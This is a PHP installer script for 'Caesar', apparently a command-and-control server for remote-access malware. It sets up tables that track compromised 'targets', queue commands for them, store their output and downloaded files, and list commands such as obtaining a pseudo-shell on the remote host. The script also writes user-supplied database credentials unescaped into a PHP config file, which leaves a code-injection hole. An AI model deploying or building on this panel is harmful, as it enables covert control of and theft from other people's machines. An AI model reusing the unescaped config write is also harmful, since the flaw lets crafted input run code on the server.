<?php

	/*
		CAESAR

		Author : Michele '0blio' Cisternino
		Email  : miki.cisternino@gmail.com
		Github : https://github.com/0blio

		This project is released under the GPL 3 license.
	*/

	use PicoDb\Database;

	if ($_SERVER['REQUEST_METHOD'] == 'POST') {
		if (isset($_POST['db_name']) and isset($_POST['db_user']) and isset($_POST['db_password']) and isset($_POST['username']) and isset($_POST['password'])) {

			$db_name = trim($_POST['db_name']);
			$db_user = trim($_POST['db_user']);
			$db_password = trim($_POST['db_password']);
			$username = $_POST['username'];
			$password = $_POST['password'];

			include 'database/include.php';

			try {
				// Trying to connect to the database
				$db = new Database(['driver' => 'mysql','hostname' => 'localhost','username' => $db_user,'password' => $db_password,'database' => $db_name]);

				// Setting up all required tables
				$db -> execute ("

					CREATE TABLE `help` (
					  `category` varchar(1) NOT NULL,
					  `command` varchar(60) DEFAULT NULL,
					  `description` varchar(255) DEFAULT NULL
					);

					INSERT INTO `help` (`category`, `command`, `description`) VALUES
					('h', 'whoami', 'Print username of the current user'),
					('h', 'destroy', 'Uninstall Caesar from the server deleting files and database'),
					('h', 'date', 'Print the server date and time'),
					('h', 'ip', 'Print your public IP'),
					('h', 'clear', 'Clear the terminal screen'),
					('h', 'newtab', 'Open a new tab of the terminal'),
					('h', 'exit', 'Exit from Caesar'),
					('h', 'targets', 'List targets'),
					('h', 'add description ID DESCRIPTION', 'Add description to the specified target'),
					('h', 'delete target ID', 'Delete the specified target (* for all)'),
					('h', 'passwd NEW_PASSWORD CONFIRM_NEW_PASSWORD', 'Change login password'),
					('h', 'select target ID', 'Select target'),
					('o', 'shell', 'Obtain a pseudo-shell on the remote host'),
					('o', 'back', 'Deselect target'),
					('o', 'delete files', 'Delete from the server all the files downloaded from the target'),
					('o', 'history', 'Get the history of the previously executed commands'),
					('o', 'clear history', 'Clear history of the previously executed commands'),
					('o', 'schedule COMMAND', 'Schedule a task for the target'),
					('o', 'queue', 'Get the queue of commands to be executed on the target'),
					('o', 'flush queue', 'Flush the target queue'),
					('h', 'help', 'Get a list of commands'),
					('o', 'files', 'Get a list of files downloaded from the target'),
					('o', 'help', 'Get a list of commands executable on the target');

					CREATE TABLE `targets` (
					  `id` int(11) NOT NULL,
					  `unique_id` varchar(32) DEFAULT NULL,
					  `hostname` varchar(60) NOT NULL,
					  `username` varchar(60) DEFAULT NULL,
					  `os` varchar(150) DEFAULT NULL,
					  `arch` varchar(5) DEFAULT NULL,
					  `ip` varchar(15) DEFAULT NULL,
					  `first_request` datetime DEFAULT NULL,
					  `last_request` datetime DEFAULT NULL,
					  `working_directory` varchar(255) DEFAULT '',
					  `description` varchar(255) NOT NULL DEFAULT ''
					);

					CREATE TABLE `tasks` (
					  `task_id` varchar(6) NOT NULL,
					  `insertion_time` datetime NOT NULL,
					  `time_run` datetime DEFAULT NULL,
					  `user_id` int(11) NOT NULL,
					  `command` varchar(255) DEFAULT NULL,
					  `output` mediumtext,
					  `executed` int(11) DEFAULT '0'
					);

					CREATE TABLE `users` (
					  `username` varchar(60) DEFAULT NULL,
					  `password` varchar(60) DEFAULT NULL
					);

					ALTER TABLE `targets`
					  ADD PRIMARY KEY (`id`);

					ALTER TABLE `tasks`
					  ADD PRIMARY KEY (`task_id`),
					  ADD KEY `id` (`user_id`);

					ALTER TABLE `targets`
					  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

					ALTER TABLE `tasks`
					  ADD CONSTRAINT `tasks_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `targets` (`id`) ON DELETE CASCADE ON UPDATE CASCADE;
				");

				// Inserting user login credential in the 'users' table
				$db -> table ('users') -> insert (['username' => $username, 'password' => password_hash ($password, PASSWORD_BCRYPT)]);
			} catch (Exception $e) {
				$message = '<p id="error">Database error!</p>';
				include_once 'templates/install.template.php';
				die();
			}

			try {
				// Writing DB credential in database/config.php
				$config = fopen ('database/config.php', 'w');

				// If the user doesn't have write permissions on the directory
				if (!$config)
					throw new Exception();

				$text = '<?php $hostname = "localhost"; $username = "' . $db_user . '"; $password = "' . $db_password . '"; $database = "' . $db_name . '";';
				fwrite ($config, $text);
				fclose ($config);

				$message = '<p id="success">Installation completed successfully! You will be redirected to the login page in a few seconds..</p>';
				include_once 'templates/install.template.php';

				// Deleting install.template.php
				unlink ('templates/install.template.php');

				// Deleting installation file
				unlink (__FILE__);

				// Redirect user to login page
				header('Refresh: 3; URL=login.php');
			} catch (Exception $e) {
				$message = '<p id="error">Error writing configuration file. Check if you have write permission.</p>';
				include_once 'templates/install.template.php';
				die();
			}
		} else {
			$message = '<p id="error">Fill out all fields!</p>';
		}
	}

	include_once 'templates/install.template.php';
